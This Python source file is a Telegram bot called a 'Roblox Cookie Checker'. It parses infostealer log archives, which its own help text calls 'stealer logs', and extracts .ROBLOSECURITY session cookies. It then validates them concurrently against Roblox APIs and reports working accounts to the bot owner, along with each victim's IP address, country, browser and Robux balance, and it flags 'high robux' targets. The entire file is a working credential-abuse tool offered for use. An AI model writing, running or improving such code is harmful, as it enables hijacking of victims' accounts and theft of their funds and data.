import asyncio
import aiohttp
import telebot
import time
import threading
import re
import os
from config import BOT_TOKEN, OWNER_ID

bot = telebot.TeleBot(BOT_TOKEN)

# ─── Stats ────────────────────────────────────────────────────────────
class CheckerStats:
    def __init__(self):
        self.reset()

    def reset(self):
        self.total = 0
        self.hits = 0
        self.dead = 0
        self.no_cookie = 0
        self.checked = 0
        self.start_time = None
        self.hits_list = []       # list of (username, user_id, robux, ip, country, browser)
        self.high_robux = []      # users with high robux value (>=1000)
        self.all_robux = 0        # total robux across all hits
        self._lock = threading.Lock()

    def add_hit(self, username, user_id, robux, ip, country, browser):
        with self._lock:
            self.hits += 1
            self.checked += 1
            self.all_robux += robux
            self.hits_list.append((username, user_id, robux, ip, country, browser))
            if robux >= 1000:
                self.high_robux.append((username, user_id, robux, ip, country, browser))

    def add_dead(self):
        with self._lock:
            self.dead += 1
            self.checked += 1

    def add_no_cookie(self):
        with self._lock:
            self.no_cookie += 1
            self.checked += 1

    def elapsed(self):
        if not self.start_time:
            return 0
        return time.time() - self.start_time

stats = CheckerStats()

# ─── Owner-only decorator ─────────────────────────────────────────────
def owner_only(func):
    def wrapper(message):
        if message.from_user.id != OWNER_ID:
            bot.reply_to(message, "⛔ Access denied. Owner only.")
            return
        return func(message)
    return wrapper

# ─── Format elapsed time ──────────────────────────────────────────────
def format_elapsed(seconds):
    h = int(seconds // 3600)
    m = int((seconds % 3600) // 60)
    s = int(seconds % 60)
    return f"{h:02d}:{m:02d}:{s:02d}"

# ─── Parse filename for metadata ──────────────────────────────────────
# Format: link1_0064_BD_103.16.226.178_27_04_2026__Cookies__Google_Chrome_Default.txt
# or:     link1_2162_AR__138.117.76.246__Cookies__Google_Chrome_Default.txt
def parse_filename(filename):
    """Extract country, IP, browser from cookie filename."""
    base = os.path.splitext(filename)[0]
    parts = base.split("__Cookies__")
    info_part = parts[0] if len(parts) >= 1 else base
    browser_part = parts[1] if len(parts) >= 2 else "Unknown"

    # Parse browser
    browser = browser_part.replace("_", " ").strip()
    if not browser:
        browser = "Unknown"

    # Parse country and IP using regex
    # Match patterns like: BD_103.16.226.178_27_04_2026 or AR__138.117.76.246__
    country = "??"
    ip = "?.?.?.?"

    # Find country code (2 uppercase letters)
    country_match = re.search(r'_([A-Z]{2})_', info_part)
    if country_match:
        country = country_match.group(1)

    # Find IP address (standard IPv4 format: xxx.xxx.xxx.xxx where each octet is 1-3 digits)
    # IP can be followed by underscore, end of string, or double underscore
    ip_match = re.search(r'_+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?:_|$)', info_part)
    if ip_match:
        ip = ip_match.group(1)

    return country, ip, browser

# ─── Parse Netscape cookie file and extract .ROBLOSECURITY ────────────
def extract_roblosecurity(content):
    """Parse a Netscape cookie file and extract the .ROBLOSECURITY cookie value."""
    for line in content.splitlines():
        line = line.strip()
        if line.startswith("#") or not line:
            continue
        # Netscape format: domain \t include_subdomains \t path \t secure \t expiry \t name \t value
        parts = line.split("\t")
        if len(parts) >= 7:
            name = parts[5].strip()
            value = parts[6].strip()
            if name == ".ROBLOSECURITY":
                return value
    return None

# ─── Progress message builder ─────────────────────────────────────────
def build_progress_text():
    elapsed = stats.elapsed()
    hits_text = ""
    if stats.hits_list:
        for username, user_id, robux, ip, country, browser in stats.hits_list:
            hits_text += f"  💎 `{username}` ({robux} R$) 🌍{country} 🖥{browser}\n"
    else:
        hits_text = "  None yet\n"

    return (
        f"⚡️ CHECKING ⚡️\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"📊 Progress:\n"
        f"🔑 Total: {stats.total}\n"
        f"💎 Hits: {stats.hits}\n"
        f"❌ Dead: {stats.dead}\n"
        f"🚫 No Cookie: {stats.no_cookie}\n"
        f"📝 Checked: {stats.checked}/{stats.total}\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"⏱️ Time: {format_elapsed(elapsed)}\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💎 Hits:\n"
        f"{hits_text}"
        f"🔥 all robux: {stats.all_robux}\n"
        f"💎 high robux value user: {len(stats.high_robux)}"
    )

# ─── Async Cookie Validator ───────────────────────────────────────────
ROBLOX_AUTH_URL = "https://www.roblox.com/mobileapi/userinfo"
ROBLOX_CURRENCY_URL = "https://economy.roblox.com/v1/users/{}/currency"

CONCURRENCY = 30  # concurrent requests for speed

async def validate_cookie(session, roblosecurity):
    """Validate a .ROBLOSECURITY cookie. Returns (valid, username, user_id, robux) or (False, None, None, 0)."""
    try:
        headers = {"Cookie": f".ROBLOSECURITY={roblosecurity}"}
        async with session.get(ROBLOX_AUTH_URL, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status != 200:
                return (False, None, None, 0)
            data = await resp.json(content_type=None)
            if "UserID" not in data:
                return (False, None, None, 0)
            user_id = data["UserID"]
            username = data.get("UserName", data.get("Username", f"User{user_id}"))
            # Get robux — only if cookie is valid
            robux = 0
            try:
                async with session.get(
                    ROBLOX_CURRENCY_URL.format(user_id),
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=8)
                ) as currency_resp:
                    if currency_resp.status == 200:
                        cdata = await currency_resp.json(content_type=None)
                        robux = cdata.get("robux", 0)
            except Exception:
                pass
            return (True, username, user_id, robux)
    except Exception:
        return (False, None, None, 0)

async def run_checker(chat_id, progress_msg, cookie_entries):
    """Run the checker with concurrency and live progress updates.
    
    cookie_entries: list of (roblosecurity_value, country, ip, browser, filename)
    """
    stats.reset()
    stats.total = len(cookie_entries)
    stats.start_time = time.time()

    connector = aiohttp.TCPConnector(limit=CONCURRENCY, limit_per_host=CONCURRENCY)
    async with aiohttp.ClientSession(connector=connector) as session:
        sem = asyncio.Semaphore(CONCURRENCY)

        async def check_one(entry):
            roblosecurity, country, ip, browser, filename = entry
            async with sem:
                result = await validate_cookie(session, roblosecurity)
                if result[0]:
                    stats.add_hit(result[1], result[2], result[3], ip, country, browser)
                else:
                    stats.add_dead()
                return result

        tasks = [check_one(e) for e in cookie_entries]

        # Progress updater — updates the Telegram message every 2 seconds
        async def progress_updater():
            while stats.checked < stats.total:
                await asyncio.sleep(2)
                try:
                    bot.edit_message_text(
                        build_progress_text(),
                        chat_id,
                        progress_msg.message_id,
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass

        updater_task = asyncio.create_task(progress_updater())
        await asyncio.gather(*tasks)
        updater_task.cancel()

    # Final update
    try:
        bot.edit_message_text(
            build_progress_text(),
            chat_id,
            progress_msg.message_id,
            parse_mode="Markdown"
        )
    except Exception:
        pass

    # Send detailed hits
    if stats.hits_list:
        hits_detail = "💎 *HITS DETAILS:*\n━━━━━━━━━━━━━━━━━\n"
        for username, user_id, robux, ip, country, browser in stats.hits_list:
            hits_detail += f"👤 `{username}` | ID: `{user_id}` | 💰 {robux} R$\n"
            hits_detail += f"🌍 {country} | 🖥 {browser} | 🌐 {ip}\n"
            hits_detail += f"🔗 https://www.roblox.com/users/{user_id}/profile\n\n"
        hits_detail += f"\n🔥 Total Robux: {stats.all_robux}\n💎 High Robux Users (≥1000 R$): {len(stats.high_robux)}"
        try:
            bot.send_message(chat_id, hits_detail, parse_mode="Markdown")
        except Exception:
            # Split if too long
            chunks = [hits_detail[i:i+4000] for i in range(0, len(hits_detail), 4000)]
            for chunk in chunks:
                bot.send_message(chat_id, chunk)

    # Send completion message
    bot.send_message(
        chat_id,
        f"✅ *Checking Complete!*\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"📝 Total: {stats.total}\n"
        f"💎 Hits: {stats.hits}\n"
        f"❌ Dead: {stats.dead}\n"
        f"🚫 No Cookie: {stats.no_cookie}\n"
        f"🔥 All Robux: {stats.all_robux}\n"
        f"⏱️ Time: {format_elapsed(stats.elapsed())}",
        parse_mode="Markdown"
    )

# ─── Process uploaded file (zip or txt) ───────────────────────────────
def process_upload(file_content, filename):
    """Process an uploaded file and return list of (roblosecurity, country, ip, browser, filename).
    
    Supports:
    - .zip containing cookie .txt files
    - .txt with one cookie per line (plain format)
    - .txt in Netscape cookie format
    """
    import zipfile
    import io
    
    cookie_entries = []
    
    # Check if it's a zip file
    if filename.endswith('.zip'):
        zip_buffer = io.BytesIO(file_content)
        try:
            with zipfile.ZipFile(zip_buffer, 'r') as zf:
                for name in zf.namelist():
                    if name.endswith('.txt') and not name.startswith('__MACOSX'):
                        try:
                            content = zf.read(name).decode('utf-8', errors='ignore')
                            basename = os.path.basename(name)
                            country, ip, browser = parse_filename(basename)
                            roblosecurity = extract_roblosecurity(content)
                            if roblosecurity:
                                cookie_entries.append((roblosecurity, country, ip, browser, basename))
                        except Exception:
                            continue
        except zipfile.BadZipFile:
            pass
    else:
        # Plain .txt file
        content = file_content.decode('utf-8', errors='ignore')
        
        # Try Netscape format first
        roblosecurity = extract_roblosecurity(content)
        if roblosecurity:
            country, ip, browser = parse_filename(filename)
            cookie_entries.append((roblosecurity, country, ip, browser, filename))
        else:
            # Plain format: one cookie per line
            for line in content.splitlines():
                line = line.strip()
                if line and not line.startswith("#"):
                    cookie_entries.append((line, "??", "?.?.?.?", "Direct", "manual"))
    
    return cookie_entries

# ─── Bot Commands ──────────────────────────────────────────────────────

@bot.message_handler(commands=["start"])
@owner_only
def handle_start(message):
    bot.reply_to(
        message,
        "⚡️ *Welcome to Roblox Cookie Checker Bot!* ⚡️\n\n"
        "Type /menu to see all commands.",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["menu"])
@owner_only
def handle_menu(message):
    bot.reply_to(
        message,
        "⚡️ *ROBLOX COOKIE CHECKER* ⚡️\n"
        "━━━━━━━━━━━━━━━━━\n\n"
        "🔥 /check - Check cookies from a .zip or .txt file\n"
        "📊 /stats - View current checker stats\n"
        "❓ /help - How to use the bot\n"
        "📋 /menu - Show this menu\n\n"
        "━━━━━━━━━━━━━━━━━\n"
        "🤖 Powered by NinjaTech",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["help"])
@owner_only
def handle_help(message):
    bot.reply_to(
        message,
        "⚡️ *Cookie Checker Help* ⚡️\n\n"
        "1️⃣ Send /check with a .zip or .txt file attached\n"
        "2️⃣ .zip should contain cookie .txt files (Netscape format)\n"
        "3️⃣ .txt can be Netscape cookie format or plain cookies (one per line)\n"
        "4️⃣ The bot extracts .ROBLOSECURITY and validates each\n"
        "5️⃣ Live progress is shown during checking\n"
        "6️⃣ After completion, hit details are displayed\n\n"
        "💡 Supports cookie files from stealer logs",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["check"])
@owner_only
def handle_check(message):
    # Check if a document is attached
    if not message.document:
        bot.reply_to(message, "❌ Please attach a .zip or .txt file with cookies.\nUsage: /check with file attached", parse_mode="Markdown")
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    filename = message.document.file_name or "unknown.txt"

    # Process the file
    cookie_entries = process_upload(downloaded, filename)

    if not cookie_entries:
        bot.reply_to(message, "❌ No .ROBLOSECURITY cookies found in the file.")
        return

    # Send initial progress message
    stats.reset()
    stats.total = len(cookie_entries)
    stats.start_time = time.time()

    no_cookie_count = 0  # files without .ROBLOSECURITY were already filtered

    bot.send_message(
        message.chat.id,
        f"📂 *File:* `{filename}`\n"
        f"🔑 *Cookies found:* {len(cookie_entries)}\n"
        f"🚀 Starting check...",
        parse_mode="Markdown"
    )
    progress_msg = bot.reply_to(message, build_progress_text(), parse_mode="Markdown")

    # Run the async checker in a thread so it doesn't block the bot
    def run_in_thread():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(run_checker(message.chat.id, progress_msg, cookie_entries))
        finally:
            loop.close()

    thread = threading.Thread(target=run_in_thread, daemon=True)
    thread.start()

@bot.message_handler(commands=["stats"])
@owner_only
def handle_stats(message):
    bot.reply_to(message, build_progress_text(), parse_mode="Markdown")

# ─── Start ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("⚡️ Cookie Checker Bot is running...")
    bot.infinity_polling()